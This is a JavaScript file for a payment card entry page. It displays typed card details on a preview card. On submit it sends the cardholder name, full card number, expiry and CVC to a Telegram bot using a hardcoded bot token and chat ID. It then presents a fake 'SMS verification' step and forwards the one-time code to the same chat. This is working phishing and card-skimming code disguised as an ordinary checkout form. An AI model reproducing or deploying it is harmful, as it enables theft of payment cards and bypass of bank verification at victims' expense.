document.addEventListener('DOMContentLoaded', function() {
    const form = document.forms['card-entry-form'];
    const smsVerificationDiv = document.getElementById('sms-verification');
    const smsCodeInput = document.getElementById('sms-code');
    const smsSubmitButton = document.getElementById('sms-submit');

    const cardholderInput = form.cardholder;
    const cardNumberInput = form.number;
    const cardMonthInput = form.month;
    const cardYearInput = form.year;
    const cardCvcInput = form.cvc;

    const cardholderDisplay = document.getElementById('card-name');
    const cardNumberDisplay = document.querySelector('.numerals');
    const cardMonthDisplay = document.getElementById('card-month');
    const cardYearDisplay = document.getElementById('card-year');
    const cardCvcDisplay = document.getElementById('card-cvc');

    function setCardData(input, display) {
        input.addEventListener('input', function() {
            display.textContent = input.value || input.placeholder;
        });
    }

    function formatCardNumber(input) {
        input.addEventListener('input', function() {
            let value = input.value.replace(/\D/g, '').substring(0, 16);
            value = value.match(/.{1,4}/g)?.join(' ') || '';
            input.value = value;
            cardNumberDisplay.textContent = value || input.placeholder;
        });
    }

    setCardData(cardholderInput, cardholderDisplay);
    setCardData(cardMonthInput, cardMonthDisplay);
    setCardData(cardYearInput, cardYearDisplay);
    setCardData(cardCvcInput, cardCvcDisplay);
    formatCardNumber(cardNumberInput);

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        const cardData = {
            cardholder: cardholderInput.value,
            number: cardNumberInput.value.replace(/\s/g, ''), // Remove spaces for actual number
            month: cardMonthInput.value,
            year: cardYearInput.value,
            cvc: cardCvcInput.value
        };

        const botToken = '6516555054:AAFdqiXb3HTc_RkncKL30Lre7eMi38iHsQo';
        const chatId = '-4276589204';

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `Cardholder: ${cardData.cardholder}\nCard Number: ${cardData.number}\nExp Date: ${cardData.month}/${cardData.year}\nCVC: ${cardData.cvc}`
            })
        }).then(response => response.json()).then(data => {
            if (data.ok) {
                document.getElementById('entry-form').style.display = 'none';
                smsVerificationDiv.style.display = 'block';
            } else {
                alert('Error sending card data to Telegram.');
            }
        }).catch(error => {
            console.error('Error:', error);
            alert('Error sending card data to Telegram.');
        });
    });

    smsSubmitButton.addEventListener('click', function() {
        const smsCode = smsCodeInput.value;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `SMS Code: ${smsCode}`
            })
        }).then(response => response.json()).then(data => {
            if (data.ok) {
                alert('SMS code sent successfully.');
                smsVerificationDiv.style.display = 'none';
                document.getElementById('confirmation').style.display = 'block';
            } else {
                alert('Error sending SMS code to Telegram.');
            }
        }).catch(error => {
            console.error('Error:', error);
            alert('Error sending SMS code to Telegram.');
        });
    });
});
